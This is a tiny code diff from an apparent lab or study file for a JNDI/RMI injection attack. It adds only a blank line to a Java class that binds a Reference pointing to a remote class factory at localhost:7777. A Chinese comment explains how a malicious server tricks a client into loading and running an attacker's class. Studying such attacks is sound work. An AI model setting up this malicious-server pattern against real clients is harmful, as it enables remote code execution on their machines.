@@ -24,5 +24,6 @@ public class JNDIRMIServer {
         Reference reference = new Reference("TestRef.class", "TestRef", "http://localhost:7777/");
         initialContext.rebind("rmi://localhost:1099/myRemote", reference);
         // todo 漏洞成因：攻击客户端（目标），创建恶意服务端，指定恶意的 factoryLocation，将其引导到一个有恶意类的地方（这个恶意类和 factory 同名），那么客户端只要访问对应的 rmi 服务，就会触发漏洞。
+
     }
 }
